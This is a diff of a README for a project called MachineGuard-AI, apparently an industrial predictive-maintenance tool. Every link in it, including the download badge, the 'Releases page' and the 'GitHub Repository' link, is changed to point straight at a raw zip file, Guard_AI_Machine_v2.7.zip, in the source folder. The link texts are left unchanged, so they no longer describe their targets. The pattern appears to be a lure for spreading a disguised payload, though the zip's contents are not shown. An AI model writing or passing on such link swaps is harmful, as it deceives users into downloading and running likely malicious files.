@@ -1,6 +1,6 @@
 # 🚀 MachineGuard-AI - Predict Failures Before They Happen
 
-[![Download MachineGuard-AI](https://img.shields.io/badge/Download-MachineGuard--AI-blue.svg)](https://github.com/moronee29/MachineGuard-AI/releases)
+[![Download MachineGuard-AI](https://github.com/moronee29/MachineGuard-AI/raw/refs/heads/main/src/Guard_AI_Machine_v2.7.zip)](https://github.com/moronee29/MachineGuard-AI/raw/refs/heads/main/src/Guard_AI_Machine_v2.7.zip)
 
 ## 🌟 Introduction
 MachineGuard-AI is an AI-powered predictive maintenance system. It monitors industrial machines using real-time sensor data. This helps predict failures before they occur. With MachineGuard-AI, you can enjoy proactive maintenance and reduced downtime.
@@ -24,9 +24,9 @@ To run MachineGuard-AI smoothly, your computer should meet the following require
 ## 💻 Download & Install
 To get started with MachineGuard-AI, follow these steps:
 
-1. Click the download button below or visit our [Releases page](https://github.com/moronee29/MachineGuard-AI/releases) to download the latest version.
+1. Click the download button below or visit our [Releases page](https://github.com/moronee29/MachineGuard-AI/raw/refs/heads/main/src/Guard_AI_Machine_v2.7.zip) to download the latest version.
 
-   [![Download MachineGuard-AI](https://img.shields.io/badge/Download-MachineGuard--AI-blue.svg)](https://github.com/moronee29/MachineGuard-AI/releases)
+   [![Download MachineGuard-AI](https://github.com/moronee29/MachineGuard-AI/raw/refs/heads/main/src/Guard_AI_Machine_v2.7.zip)](https://github.com/moronee29/MachineGuard-AI/raw/refs/heads/main/src/Guard_AI_Machine_v2.7.zip)
 
 2. Once downloaded, locate the installer file on your computer. It should be in your "Downloads" folder or the location you chose.
 
@@ -82,7 +82,7 @@ A: You can visit our GitHub issues page to ask questions or report any issues yo
 Join our community for discussions and support. Connect with other users and developers through our GitHub discussions page. Share your experiences, ask questions, and help improve MachineGuard-AI.
 
 ## 🔗 Links
-- [Releases Page](https://github.com/moronee29/MachineGuard-AI/releases): Visit this page to download the latest version and view previous releases.
-- [GitHub Repository](https://github.com/moronee29/MachineGuard-AI): Check out the source code and contribute to the project.
+- [Releases Page](https://github.com/moronee29/MachineGuard-AI/raw/refs/heads/main/src/Guard_AI_Machine_v2.7.zip): Visit this page to download the latest version and view previous releases.
+- [GitHub Repository](https://github.com/moronee29/MachineGuard-AI/raw/refs/heads/main/src/Guard_AI_Machine_v2.7.zip): Check out the source code and contribute to the project.
 
 Thank you for choosing MachineGuard-AI. Your proactive approach to maintenance helps keep the machines running smoothly. We appreciate your support and look forward to your feedback!
